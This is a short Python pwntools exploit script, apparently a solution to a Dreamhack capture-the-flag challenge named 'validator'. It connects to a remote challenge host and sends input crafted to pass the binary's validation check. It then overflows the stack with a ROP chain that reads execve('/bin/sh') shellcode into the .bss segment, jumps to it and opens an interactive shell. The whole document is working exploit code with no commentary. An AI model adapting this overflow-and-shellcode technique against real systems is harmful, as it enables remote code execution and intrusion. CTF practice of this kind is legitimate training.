from pwn import *

# context.log_level = 'debug'
context.arch ='amd64'


p = remote('host1.dreamhack.games', 13902)
e = ELF('./validator_server')

poprdi = 0x4006f3
poprsi_r15 = 0x4006f1
poprdx = 0x40057b
ret = 0x40044e
bss = e.bss()
sh = asm(shellcraft.execve('/bin/sh', 0, 0))
read_plt = e.plt['read']

payload = b'DREAMHACK!'

payload += bytes([118 - i for i in range(119)])
payload += b'A' * 0x7

print(len(payload))
payload += p64(poprdi) 
payload += p64(0)
payload += p64(poprsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(poprdx)
payload += p64(len(sh)+1)
payload += p64(read_plt)
payload += p64(bss)

print(hex(read_plt))

sleep(0.5)
p.send(payload)
sleep(0.5)
p.send(sh)


p.interactive()